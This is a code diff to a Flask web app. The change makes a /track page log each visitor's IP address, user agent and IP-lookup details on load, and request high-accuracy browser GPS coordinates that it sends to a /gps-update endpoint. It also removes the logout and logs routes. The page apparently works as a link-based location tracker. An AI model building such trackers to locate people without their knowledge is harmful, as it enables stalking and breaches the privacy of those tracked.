@@ -568,22 +568,37 @@ def home():
     """
 
 
-@app.route("/logout")
-@login_required
-
-def logout():
-    logout_user()
-    return redirect(url_for("login"))
-
-
-@app.route("/logs")
-@login_required
-def show_logs():
-    return jsonify(logs)
-
-
 @app.route("/track")
 def track_page():
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+
+    user_agent = request.headers.get("User-Agent")
+    client_type = detect_client(user_agent)
+    ip_info = get_ip_info(ip)
+
+    log_entry = {
+        "ip": ip,
+        "time": datetime.now(
+            ZoneInfo("Asia/Kolkata")
+        ).strftime("%Y-%m-%d %I:%M:%S %p"),
+        "user_agent": user_agent,
+        "client_type": client_type,
+        "ip_info": ip_info,
+        "battery": None,
+        "charging": None,
+        "gps_lat": None,
+        "gps_lon": None,
+        "gps_accuracy": None
+    }
+
+    logs.append(log_entry)
+    save_logs()
+    save_log_to_database(log_entry)
+    rebuild_stats()
+
     return """
     <html>
     <head>
@@ -617,12 +632,6 @@ def track_page():
 
         <script>
             function getLocation() {
-                if (!navigator.geolocation) {
-                    document.getElementById("status").innerText =
-                    "GPS not supported";
-                    return;
-                }
-
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         let lat = position.coords.latitude;
@@ -633,23 +642,27 @@ def track_page():
                             "/gps-update?lat=" + lat +
                             "&lon=" + lon +
                             "&accuracy=" + accuracy
-                        );
-
-                        document.getElementById("status").innerText =
-                        "Location received successfully.";
+                        ).then(() => {
+                            document.getElementById("status").innerText =
+                            "Location received successfully.";
+                        });
                     },
                     function(error) {
                         document.getElementById("status").innerText =
                         "Location permission denied.";
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
                     }
                 );
             }
         </script>
     </body>
     </html>
-      </html>
     """
-
+    
 
 @app.route("/gps-update")
 def gps_update():
